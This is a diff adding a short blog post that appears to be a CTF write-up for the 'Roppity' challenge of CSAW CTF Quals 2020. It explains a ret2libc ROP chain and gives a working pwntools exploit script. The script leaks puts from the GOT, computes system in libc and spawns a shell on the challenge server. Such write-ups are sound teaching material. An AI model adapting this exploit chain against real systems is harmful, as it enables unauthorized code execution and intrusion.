@@ -1,0 +1,65 @@
+export const meta = {
+  title: "Roppity (CSAW CTF Quals 2020)",
+  description: "(CSAW CTF Quals 2020)",
+  date: "September 14, 2020",
+};
+
+import styles from "../../../styles/post.module.css";
+
+<div className={styles.post}>
+
+# Roppity (CSAW CTF Quals 2020)
+
+###### September 14, 2020
+
+The executable was compiled without support for position independent code. Because of this, a ROP chain could be built to leak the address of the <code>puts</code> function in <code>libc</code> through the global offset table. The executable was restarted by jumping back to <code>\_start</code>. Using the address of <code>puts</code>, the address of <code>system</code> in <code>libc</code> was calculated, which was used to spawn a shell.
+
+<div className={styles.codeblock}>
+
+```
+from pwn import *
+
+#target = process('./rop')
+#libc = ELF('/usr/lib/libc.so.6')
+
+# pwn.chal.csaw.io 5016
+target = remote('pwn.chal.csaw.io', 5016)
+libc = ELF('libc-2.27.so')
+
+pop_rdi = 0x400683
+got_puts = 0x601018
+plt_puts = 0x4004a0
+ret = 0x40048e
+start = 0x4004d0
+
+payload = b''
+payload += b'A'*40
+payload += p64(pop_rdi)
+payload += p64(got_puts) # leak addr
+payload += p64(plt_puts) # print address of puts in libc
+payload += p64(start) # restart
+
+target.recv() # Hello
+target.sendline(payload)
+libc_puts = int.from_bytes((target.recv()[:-7]), byteorder='little') # Remove the second b'Hello\n'
+
+libc.address = libc_puts - libc.symbols['puts']
+
+bin_sh = next(libc.search(b'/bin/sh'))
+
+libc_system = libc.symbols['system']
+
+payload = b''
+payload += b'A' * 40
+payload += p64(pop_rdi)
+payload += p64(bin_sh)
+payload += p64(ret)
+payload += p64(libc_system)
+
+target.sendline(payload)
+target.interactive()
+```
+</div>
+
+</div>
+
